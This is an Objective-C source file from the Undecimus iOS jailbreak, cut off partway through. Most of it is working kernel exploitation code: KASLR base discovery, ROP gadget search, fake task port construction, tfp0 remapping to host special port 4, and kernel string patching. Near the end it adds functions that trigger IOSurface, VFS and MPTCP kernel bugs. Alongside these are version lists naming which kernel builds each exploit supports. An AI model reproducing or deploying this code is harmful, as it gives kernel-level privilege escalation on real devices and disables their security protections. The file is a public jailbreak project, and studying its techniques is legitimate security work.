//
//  ViewController.m
//  Undecimus
//
//  Created by pwn20wnd on 8/29/18.
//  Copyright © 2018 Pwn20wnd. All rights reserved.
//

#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/syscall.h>
#include <common.h>
#include <iokit.h>
#include <QiLin.h>
#include <NSTask.h>
#include <MobileGestalt.h>
#include <netdb.h>
#include <reboot.h>
#import <snappy.h>
#import <inject.h>
#import "ViewController.h"
#include "offsets.h"
#include "empty_list_sploit.h"
#include "kmem.h"
#include "patchfinder64.h"
#include "kexecute.h"
#include "kutils.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "unlocknvram.h"
#include "SettingsTableViewController.h"
#include "untar.h"
#include "multi_path_sploit.h"
#include "async_wake.h"
#include "utils.h"

@interface NSUserDefaults ()
- (id)objectForKey:(id)arg1 inDomain:(id)arg2;
- (void)setObject:(id)arg1 forKey:(id)arg2 inDomain:(id)arg3;
@end

@interface ViewController ()

@end

@implementation ViewController
static ViewController *sharedController = nil;

#define PROGRESS(msg, btnenbld, tbenbld) do { \
        LOG("PROGRESS: %@", msg); \
        dispatch_async(dispatch_get_main_queue(), ^{ \
            [UIView performWithoutAnimation:^{ \
                [[[ViewController sharedController] goButton] setEnabled:btnenbld]; \
                [[[[ViewController sharedController] tabBarController] tabBar] setUserInteractionEnabled:tbenbld]; \
                [[[ViewController sharedController] goButton] setTitle:msg forState: btnenbld ? UIControlStateNormal : UIControlStateDisabled]; \
                [[[ViewController sharedController] goButton] layoutIfNeeded]; \
            }]; \
        }); \
} while (false)

int stage = __COUNTER__;
extern int maxStage;

#define PROGRESSWITHSTAGE(Stage, MaxStage) PROGRESS(([NSString stringWithFormat:@"%@ (%d/%d)", NSLocalizedString(@"Exploiting", nil), Stage, MaxStage]), false, false)
#define UPSTAGE() do { \
    __COUNTER__; \
    stage++; \
    PROGRESSWITHSTAGE(stage, maxStage); \
} while (false)

typedef struct {
    kptr_t trust_chain;
    kptr_t amficache;
    kptr_t OSBoolean_True;
    kptr_t OSBoolean_False;
    kptr_t osunserializexml;
    kptr_t smalloc;
    kptr_t allproc;
    kptr_t add_x0_x0_0x40_ret;
    kptr_t rootvnode;
    kptr_t zone_map_ref;
    kptr_t vfs_context_current;
    kptr_t vnode_lookup;
    kptr_t vnode_put;
    kptr_t kernproc;
    kptr_t kernel_task;
    kptr_t shenanigans;
} offsets_t;

typedef struct {
    bool load_tweaks;
    bool load_daemons;
    bool dump_apticket;
    bool run_uicache;
    const char *boot_nonce;
    bool disable_auto_updates;
    bool disable_app_revokes;
    bool overwrite_boot_nonce;
    bool export_kernel_task_port;
    bool restore_rootfs;
    bool increase_memory_limit;
    bool install_cydia;
    bool install_openssh;
    bool reload_system_daemons;
} prefs_t;

const char *empty_list_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.7.2~3",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    "4570.60.10.0.1~16",
    "4570.60.16~9",
    "4570.60.19~25",
    NULL
};

const char *multi_path_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.7.2~3",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    NULL
};

const char *async_wake_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.7.2~3",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    NULL
};

const char *deja_xnu_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.7.2~3",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    "4570.60.10.0.1~16",
    "4570.60.16~9",
    "4570.60.19~25",
    "4570.60.21~7",
    "4570.60.21~3",
    "4570.70.14~16",
    "4570.70.19~13",
    "4570.70.24~9",
    "4570.70.24~3",
    NULL
};

const char *necp_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.7.2~3",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    "4570.60.10.0.1~16",
    "4570.60.16~9",
    "4570.60.19~25",
    "4570.60.21~7",
    "4570.60.21~3",
    "4570.70.14~16",
    "4570.70.19~13",
    "4570.70.24~9",
    "4570.70.24~3",
    NULL
};

#define ISADDR(val)            (val != 0 && val != HUGE_VAL && val != -HUGE_VAL)
#define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]
#define VSHARED_DYLD           0x000200

#define BUNDLEDRESOURCES [[[NSBundle mainBundle] infoDictionary] objectForKey:@"BundledResources"]

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

#define ptrSize sizeof(uintptr_t)

static void writeTestFile(const char *file) {
    _assert(create_file(file, 0, 0644), message, true);
    _assert(unlink(file) == ERR_SUCCESS, message, true);
}

static vm_address_t get_kernel_base(mach_port_t tfp0)
{
    uint64_t addr = 0;
    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                LOG("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    LOG("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

uint64_t
find_gadget_candidate(
                      char** alternatives,
                      size_t gadget_length)
{
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            LOG("found at: %llx\n", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

// thx Siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    if (zm_hdr.start == 0) {
        // xxx ReadKernel64(0) ?!
        // uint64_t zone_map_ref = find_zone_map_ref();
        LOG("zone_map_ref: %llx \n", zone_map_ref);
        uint64_t zone_map = ReadKernel64(zone_map_ref);
        LOG("zone_map: %llx \n", zone_map);
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        LOG("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            LOG("kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            LOG("zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
    
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info_addr) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_addr to: " ADDR "\n", all_image_info_addr);
    if (dyld_info.all_image_info_addr != all_image_info_addr) {
        LOG("Setting all_image_info_addr...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), all_image_info_addr);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_addr == all_image_info_addr, message, true);
    } else {
        LOG("All_image_info_addr already set.");
    }
}

void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_size to: " ADDR "\n", all_image_info_size);
    if (dyld_info.all_image_info_size != all_image_info_size) {
        LOG("Setting all_image_info_size...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
    } else {
        LOG("All_image_info_size already set.");
    }
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
void remap_tfp0_set_hsp4(mach_port_t *port, uint64_t kernel_task, uint64_t zone_map_ref, uint64_t kernel_base, uint64_t kernel_slide) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    uint64_t kernel_task_kaddr = ReadKernel64(kernel_task);
    _assert(kernel_task_kaddr != 0, message, true);
    LOG("kernel_task_kaddr: " ADDR "\n", kernel_task_kaddr);
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    kr = kr || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    if (kr == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, message, true);
    }
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref;
    uint64_t zone_map = ReadKernel64(zone_map_kptr);
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    km_fake_task_port = zm_fake_task_port;
    vm_prot_t cur = 0;
    vm_prot_t max = 0;
    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, message, true);
    _assert(kernel_task_kaddr != remapped_task_addr, message, true);
    LOG("remapped_task_addr: " ADDR "\n", remapped_task_addr);
    _assert(mach_vm_wire(mach_host_self(), km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
    LOG("port_kaddr: " ADDR "\n", port_kaddr);
    make_port_fake_task_port(*port, remapped_task_addr);
    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
    // lck_mtx -- arm: 8  arm64: 16
    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
    uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void*), port_kaddr);
    set_all_image_info_addr(kernel_task_kaddr, kernel_base);
    set_all_image_info_size(kernel_task_kaddr, kernel_slide);
}

void blockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    SETMESSAGE(NSLocalizedString(@"Failed to block domain with name.", nil));
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location == NSNotFound) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location == NSNotFound) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

void unblockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    SETMESSAGE(NSLocalizedString(@"Failed to unblock domain with name.", nil));
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0    %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define DEFAULT_VERSION_STRING "Hacked"

int updateVersionString(const char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
    
    uintptr_t darwinTextPtr = 0;
    
    char *buf = NULL;
    
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
    
    char *sectName = "__const";
    
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            LOG("Failed vm_read %i\n", ret);
            exit(-1);
        }
        
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
            
        }
        
        else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
    
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        LOG("Error parsing kernel macho\n");
        return -1;
    }
    
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2)
    {
        int ret = vm_read_overwrite(tfp0, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            LOG("Failed vm_read %i\n", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
    
    if (!darwinTextPtr) {
        LOG("Error finding Darwin text\n");
        return -1;
    }
    
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
    
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
        int ret = vm_read_overwrite(tfp0, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            LOG("Failed vm_read %i\n", ret);
            return -1;
        }
        
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
    
    if (!versionPtr) {
        LOG("Error finding _version pointer, did you already patch it?\n");
        return -1;
    }
    
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(tfp0, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
    
    ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        LOG("Failed vm_write %i\n", ret);
        exit(-1);
    }
    
    ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        LOG("Failed vm_write %i\n", ret);
        return -1;
    }
    else {
        memset(&u, 0x0, sizeof(u));
        uname(&u);
        return 0;
    }
}

uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
    // vfs_context_t vfs_context_current(void)
    uint64_t vfs_context = kexecute(vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
    vfs_context = zm_fix_addr(vfs_context, zone_map_ref);
    return vfs_context;
}

int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = ReadKernel64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode_put, uint64_t vnode){
    return (int)kexecute(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(uint64_t vfs_context, const char *path, uint64_t vnode_lookup){
    uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
    int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
    if (ret != 0){
        LOG("unable to get vnode from path for %s\n", path);
        free(vpp);
        return -1;
    }
    uint64_t vnode = *vpp;
    free(vpp);
    return vnode;
}

typedef struct val_attrs {
    uint32_t          length;
    attribute_set_t   returned;
    attrreference_t   name_info;
} val_attrs_t;

int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

void iosurface_die() {
    kern_return_t err;
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL){
        LOG("unable to find service\n");
        return;
    }
    
    LOG("got service port\n");
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (err != KERN_SUCCESS){
        LOG("unable to get user client connection\n");
        return;
    }
    
    LOG("got user client: 0x%x\n", conn);
    
    uint64_t inputScalar[16];
    uint64_t inputScalarCnt = 0;
    
    char inputStruct[4096];
    size_t inputStructCnt = 0x18;
    
    
    uint64_t* ivals = (uint64_t*)inputStruct;
    ivals[0] = 1;
    ivals[1] = 2;
    ivals[2] = 3;
    
    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;
    
    char outputStruct[4096];
    size_t outputStructCnt = 0;
    
    mach_port_t port = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        LOG("failed to allocate new port\n");
        return;
    }
    LOG("got wake port 0x%x\n", port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    uint64_t reference[8] = {0};
    uint32_t referenceCnt = 1;
    
    for (int i = 0; i < 10; i++) {
        err = IOConnectCallAsyncMethod(
                                       conn,
                                       17,
                                       port,
                                       reference,
                                       referenceCnt,
                                       inputScalar,
                                       (uint32_t)inputScalarCnt,
                                       inputStruct,
                                       inputStructCnt,
                                       outputScalar,
                                       &outputScalarCnt,
                                       outputStruct,
                                       &outputStructCnt);
        
        LOG("%x\n", err);
    };
    
    return;
}

int vfs_die() {
    int fd = open("/", O_RDONLY);
    if (fd == -1) {
        perror("unable to open fs root\n");
        return 0;
    }
    
    struct attrlist al = {0};
    
    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;
    
    size_t attrBufSize = 16;
    void* attrBuf = malloc(attrBufSize);
    int options = 0;
    
    int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
    LOG("err: %d\n", err);
    return 0;
}

#define AF_MULTIPATH 39

int mptcp_die() {
    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    if (sock < 0) {
        LOG("socket failed\n");
        perror("");
        return 0;
    }
    LOG("got socket: %d\n", sock);
    
    struct sockaddr* sockaddr_src = malloc(256);
    memset(sockaddr_src, 'A', 256);
    sockaddr_src->sa_len = 220;
    sockaddr_src->sa_family = 'B';
    
    struct sockaddr* sockaddr_dst = malloc(256);
    memset(sockaddr_dst, 'A', 256);
    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
    sockaddr_dst->sa_family = AF_INET6;
    
    sa_endpoints_t eps = {0};
    eps.sae_srcif = 0;
    eps.sae_srcaddr = sockaddr_src;
    eps.sae_srcaddrlen = 220;
    eps.sae_dstaddr = sockaddr_dst;
    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
    
    int err = connectx(
                       sock,
